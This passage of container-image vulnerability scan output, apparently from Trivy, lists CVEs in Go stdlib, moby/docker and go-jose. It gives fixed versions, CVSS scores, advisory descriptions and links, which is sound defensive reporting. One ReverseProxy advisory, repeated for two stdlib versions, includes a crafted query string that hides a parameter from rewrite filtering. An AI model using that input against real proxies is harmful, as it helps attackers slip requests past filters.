│     │     │                   Rewrite function. For example, the query "a1=x&a2=x&...&a10000=x&hidden=y" can
│     │     │                   forward the parameter "hidden=y" while hiding it from the proxy's Rewrite
│     │     │                   function. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/770541 
│     │     │                  ├ [1]: https://go.dev/issue/78948 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4976 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.39Z 
│     │     ╰ LastModifiedDate: 2026-05-08T22:16:29.547Z 
│     ├ [5] ╭ VulnerabilityID : CVE-2026-39826 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4980 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : bf537c19fc386d01 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39826 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:d561ca3a59ffba54dc7979bfb00f7bec5749f7b03602dc5310b869333991a53b 
│     │     ├ Title           : If a trusted template author were to write a <script> tag containing a ... 
│     │     ├ Description     : If a trusted template author were to write a <script> tag containing an empty
│     │     │                   'type' attribute or a 'type' attribute with an ASCII whitespace, the execution
│     │     │                   of the template would incorrectly escape any data passed into the <script>
│     │     │                   block. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/771180 
│     │     │                  ├ [1]: https://go.dev/issue/78981 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4980 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.49Z 
│     │     ╰ LastModifiedDate: 2026-05-08T15:16:37.68Z 
│     ├ [6] ╭ VulnerabilityID : CVE-2026-39836 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4971 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : bf537c19fc386d01 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39836 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:11cad8ced102444a781e437f15d9bb58fb3b2629b4e6bd0a81fa7a441cc18de2 
│     │     ├ Title           : Panic in Dial and LookupPort when handling NUL byte on Windows in net 
│     │     ├ Description     : The Dial and LookupPort functions panic on Windows when provided with an input
│     │     │                   containing a NUL (0). 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/775320 
│     │     │                  ├ [1]: https://go.dev/issue/79006 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4971 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.593Z 
│     │     ╰ LastModifiedDate: 2026-05-08T22:16:29.723Z 
│     ╰ [7] ╭ VulnerabilityID : CVE-2026-42499 
│           ├ VendorIDs        ─ [0]: GO-2026-4977 
│           ├ PkgID           : stdlib@v1.26.2 
│           ├ PkgName         : stdlib 
│           ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│           │                  ╰ UID : bf537c19fc386d01 
│           ├ InstalledVersion: v1.26.2 
│           ├ FixedVersion    : 1.25.10, 1.26.3 
│           ├ Status          : fixed 
│           ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│           │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│           ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42499 
│           ├ DataSource       ╭ ID  : govulndb 
│           │                  ├ Name: The Go Vulnerability Database 
│           │                  ╰ URL : https://pkg.go.dev/vuln/ 
│           ├ Fingerprint     : sha256:5d7bbd78b472209494a79667621887f17087ddbb477de2cfef01afe686c655ff 
│           ├ Title           : Pathological inputs could cause DoS through consumePhrase when parsing ... 
│           ├ Description     : Pathological inputs could cause DoS through consumePhrase when parsing an email
│           │                    address according to RFC 5322. 
│           ├ Severity        : UNKNOWN 
│           ├ References       ╭ [0]: https://go.dev/cl/771520 
│           │                  ├ [1]: https://go.dev/issue/78987 
│           │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│           │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4977 
│           ├ PublishedDate   : 2026-05-07T20:16:44.54Z 
│           ╰ LastModifiedDate: 2026-05-08T22:16:33.183Z 
├ [5] ╭ [0] ╭ VulnerabilityID : CVE-2026-33811 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4981 
│     │     ├ PkgID           : stdlib@v1.25.9 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.9 
│     │     │                  ╰ UID : 24a9c780aa9b26bf 
│     │     ├ InstalledVersion: v1.25.9 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33811 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:06d1fdb04aaec2963e10df8217f809fd7aa9d46be72daadacef058afe6e26c49 
│     │     ├ Title           : When using LookupCNAME with the cgo DNS resolver, a very long CNAME re ... 
│     │     ├ Description     : When using LookupCNAME with the cgo DNS resolver, a very long CNAME response
│     │     │                   can trigger a double-free of C memory and a crash. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/767860 
│     │     │                  ├ [1]: https://go.dev/issue/78803 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4981 
│     │     ├ PublishedDate   : 2026-05-07T20:16:42.77Z 
│     │     ╰ LastModifiedDate: 2026-05-08T15:16:36.64Z 
│     ├ [1] ╭ VulnerabilityID : CVE-2026-33814 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4918 
│     │     ├ PkgID           : stdlib@v1.25.9 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.9 
│     │     │                  ╰ UID : 24a9c780aa9b26bf 
│     │     ├ InstalledVersion: v1.25.9 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:58adc59c8ee613530903b3bea91bce7ca12bb39a2b0f4a623699ad9edb6b876a 
│     │     ├ Title           : When processing HTTP/2 SETTINGS frames, transport will enter an infini ... 
│     │     ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
│     │     │                   of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a
│     │     │                   value of 0. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/761581 
│     │     │                  ├ [1]: https://go.dev/cl/761640 
│     │     │                  ├ [2]: https://go.dev/issue/78476 
│     │     │                  ├ [3]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4918 
│     │     ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
│     │     ╰ LastModifiedDate: 2026-05-08T19:16:30.567Z 
│     ├ [2] ╭ VulnerabilityID : CVE-2026-39820 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4986 
│     │     ├ PkgID           : stdlib@v1.25.9 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.9 
│     │     │                  ╰ UID : 24a9c780aa9b26bf 
│     │     ├ InstalledVersion: v1.25.9 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39820 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:262660a3c2edf0d7ca84ae905eb2e3279061f9f4f02a4d1396ea72d74d12feb9 
│     │     ├ Title           : Well-crafted inputs reaching ParseAddress, ParseAddressList, and Parse ... 
│     │     ├ Description     : Well-crafted inputs reaching ParseAddress, ParseAddressList, and ParseDate were
│     │     │                    able to trigger excessive CPU exhaustion and memory allocations. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/759940 
│     │     │                  ├ [1]: https://go.dev/issue/78566 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4986 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.187Z 
│     │     ╰ LastModifiedDate: 2026-05-08T15:16:37.323Z 
│     ├ [3] ╭ VulnerabilityID : CVE-2026-39823 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4982 
│     │     ├ PkgID           : stdlib@v1.25.9 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.9 
│     │     │                  ╰ UID : 24a9c780aa9b26bf 
│     │     ├ InstalledVersion: v1.25.9 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39823 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:0db7aead9aca72af15aef3f8cc95fad9c6fea0f013ed2abfa851713459649891 
│     │     ├ Title           : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly  ... 
│     │     ├ Description     : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly escaped
│     │     │                   inside of a <meta> tag's <content> attribute. If the URL content were to insert
│     │     │                    ASCII whitespaces around the '=' rune inside of the <content> attribute, the
│     │     │                   escaper would fail to similarly escape it, leading to XSS. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/769920 
│     │     │                  ├ [1]: https://go.dev/issue/78913 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4982 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.29Z 
│     │     ╰ LastModifiedDate: 2026-05-08T15:16:37.5Z 
│     ├ [4] ╭ VulnerabilityID : CVE-2026-39825 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4976 
│     │     ├ PkgID           : stdlib@v1.25.9 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.9 
│     │     │                  ╰ UID : 24a9c780aa9b26bf 
│     │     ├ InstalledVersion: v1.25.9 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39825 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:72ccf3fd40d9b97d4d167e792e872e0654df02491dd9dc446e35f0163a167d1a 
│     │     ├ Title           : ReverseProxy can forward queries containing parameters not visible to  ... 
│     │     ├ Description     : ReverseProxy can forward queries containing parameters not visible to Rewrite
│     │     │                   functions. When used with a Rewrite function, or a Director function which
│     │     │                   parses query parameters, ReverseProxy sanitizes the forwarded request to remove
│     │     │                    query parameters which are not parsed by url.ParseQuery. ReverseProxy does not
│     │     │                    take ParseQuery's limit on the total number of query parameters (controlled by
│     │     │                    GODEBUG=urlmaxqueryparams=N) into account. This can permit ReverseProxy to
│     │     │                   forward a request containing a query parameter that is not visible to the
│     │     │                   Rewrite function. For example, the query "a1=x&a2=x&...&a10000=x&hidden=y" can
│     │     │                   forward the parameter "hidden=y" while hiding it from the proxy's Rewrite
│     │     │                   function. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/770541 
│     │     │                  ├ [1]: https://go.dev/issue/78948 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4976 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.39Z 
│     │     ╰ LastModifiedDate: 2026-05-08T22:16:29.547Z 
│     ├ [5] ╭ VulnerabilityID : CVE-2026-39826 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4980 
│     │     ├ PkgID           : stdlib@v1.25.9 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.9 
│     │     │                  ╰ UID : 24a9c780aa9b26bf 
│     │     ├ InstalledVersion: v1.25.9 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39826 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:a0e78dbb528a0c9c8f5217235a7ebba009ff7811cf3665c0f33027df15b44837 
│     │     ├ Title           : If a trusted template author were to write a <script> tag containing a ... 
│     │     ├ Description     : If a trusted template author were to write a <script> tag containing an empty
│     │     │                   'type' attribute or a 'type' attribute with an ASCII whitespace, the execution
│     │     │                   of the template would incorrectly escape any data passed into the <script>
│     │     │                   block. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/771180 
│     │     │                  ├ [1]: https://go.dev/issue/78981 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4980 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.49Z 
│     │     ╰ LastModifiedDate: 2026-05-08T15:16:37.68Z 
│     ├ [6] ╭ VulnerabilityID : CVE-2026-39836 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4971 
│     │     ├ PkgID           : stdlib@v1.25.9 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.9 
│     │     │                  ╰ UID : 24a9c780aa9b26bf 
│     │     ├ InstalledVersion: v1.25.9 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39836 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:c019f407217bf91e1a3b924dd905fb978e9feb318e4ee457ccb0a59c5d1c907d 
│     │     ├ Title           : Panic in Dial and LookupPort when handling NUL byte on Windows in net 
│     │     ├ Description     : The Dial and LookupPort functions panic on Windows when provided with an input
│     │     │                   containing a NUL (0). 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/775320 
│     │     │                  ├ [1]: https://go.dev/issue/79006 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4971 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.593Z 
│     │     ╰ LastModifiedDate: 2026-05-08T22:16:29.723Z 
│     ╰ [7] ╭ VulnerabilityID : CVE-2026-42499 
│           ├ VendorIDs        ─ [0]: GO-2026-4977 
│           ├ PkgID           : stdlib@v1.25.9 
│           ├ PkgName         : stdlib 
│           ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.9 
│           │                  ╰ UID : 24a9c780aa9b26bf 
│           ├ InstalledVersion: v1.25.9 
│           ├ FixedVersion    : 1.25.10, 1.26.3 
│           ├ Status          : fixed 
│           ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│           │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│           ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42499 
│           ├ DataSource       ╭ ID  : govulndb 
│           │                  ├ Name: The Go Vulnerability Database 
│           │                  ╰ URL : https://pkg.go.dev/vuln/ 
│           ├ Fingerprint     : sha256:79175cc0b8eab4f47f2459394b4a2ba65a77948c5835d51f3881053620a867f2 
│           ├ Title           : Pathological inputs could cause DoS through consumePhrase when parsing ... 
│           ├ Description     : Pathological inputs could cause DoS through consumePhrase when parsing an email
│           │                    address according to RFC 5322. 
│           ├ Severity        : UNKNOWN 
│           ├ References       ╭ [0]: https://go.dev/cl/771520 
│           │                  ├ [1]: https://go.dev/issue/78987 
│           │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│           │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4977 
│           ├ PublishedDate   : 2026-05-07T20:16:44.54Z 
│           ╰ LastModifiedDate: 2026-05-08T22:16:33.183Z 
├ [6] ╭ [0]  ╭ VulnerabilityID : CVE-2026-34040 
│     │      ├ VendorIDs        ─ [0]: GHSA-x744-4wpc-v9h2 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.2%2Bincompatible 
│     │      │                  ╰ UID : 5ca542d69533e63f 
│     │      ├ InstalledVersion: v28.5.2+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-34040 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:92aecbd8fbc55d90fff46403dc7d242ce2a9454e8831e16ae3c00878fedd099c 
│     │      ├ Title           : Moby: Moby: Authorization bypass vulnerability 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows attackers to bypass
│     │      │                   authorization plugins (AuthZ). This issue has been patched in version
│     │      │                   29.3.1. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-288 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 8.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 7.8 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-34040 
│     │      │                  ├ [1]: https://docs.docker.com/engine/extend/plugins_authorization 
│     │      │                  ├ [2]: https://github.com/moby/moby 
│     │      │                  ├ [3]: https://github.com/moby/moby/commit/e89edb19ad7de0407a5d31e3111cb01aa10b
│     │      │                  │      5a38 
│     │      │                  ├ [4]: https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [5]: https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq 
│     │      │                  ├ [6]: https://github.com/moby/moby/security/advisories/GHSA-x744-4wpc-v9h2 
│     │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-34040 
│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-34040 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.883Z 
│     │      ╰ LastModifiedDate: 2026-04-03T16:51:28.67Z 
│     ├ [1]  ╭ VulnerabilityID : CVE-2026-33997 
│     │      ├ VendorIDs        ─ [0]: GHSA-pxq6-2prw-chj9 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.2%2Bincompatible 
│     │      │                  ╰ UID : 5ca542d69533e63f 
│     │      ├ InstalledVersion: v28.5.2+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33997 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:8eda2ccee6704a5fe4189ebe69fde01e6001fbbd298c3f5a51a0558d6c4346bc 
│     │      ├ Title           : moby: docker: github.com/moby/moby: Moby: Privilege validation bypass during
│     │      │                   plugin installation 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows plugins privilege
│     │      │                   validation to be bypassed during docker plugin install. Due to an error in the
│     │      │                    daemon's privilege comparison logic, the daemon may incorrectly accept a
│     │      │                   privilege set that differs from the one approved by the user. Plugins that
│     │      │                   request exactly one privilege are also affected, because no comparison is
│     │      │                   performed at all. This issue has been patched in version 29.3.1. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-193 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 6.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 8.1 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-33997 
│     │      │                  ├ [1]: https://docs.docker.com/engine/extend/legacy_plugins 
│     │      │                  ├ [2]: https://github.com/moby/moby 
│     │      │                  ├ [3]: https://github.com/moby/moby/commit/f4d6f25bf0c3fa12d4968320a45685947756
│     │      │                  │      a22a 
│     │      │                  ├ [4]: https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [5]: https://github.com/moby/moby/security/advisories/GHSA-pxq6-2prw-chj9 
│     │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-33997 
│     │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-33997 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.523Z 
│     │      ╰ LastModifiedDate: 2026-04-03T17:23:21.307Z 
│     ├ [2]  ╭ VulnerabilityID : CVE-2026-34986 
│     │      ├ VendorIDs        ─ [0]: GHSA-78h2-9frx-2jm8 
│     │      ├ PkgID           : github.com/go-jose/go-jose/v4@v4.1.3 
│     │      ├ PkgName         : github.com/go-jose/go-jose/v4 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/go-jose/go-jose/v4@v4.1.3 
│     │      │                  ╰ UID : be04c62b44f58486 
│     │      ├ InstalledVersion: v4.1.3 
│     │      ├ FixedVersion    : 4.1.4 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-34986 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:29b4f6cf7447485b588f61f93d6801d61d59e66b2023f5b18ce045c26ec54e3e 
│     │      ├ Title           : github.com/go-jose/go-jose/v3: github.com/go-jose/go-jose/v4: Go JOSE: Denial
│     │      │                   of Service via crafted JSON Web Encryption (JWE) object 
│     │      ├ Description     : Go JOSE provides an implementation of the Javascript Object Signing and
│     │      │                   Encryption set of standards in Go, including support for JSON Web Encryption
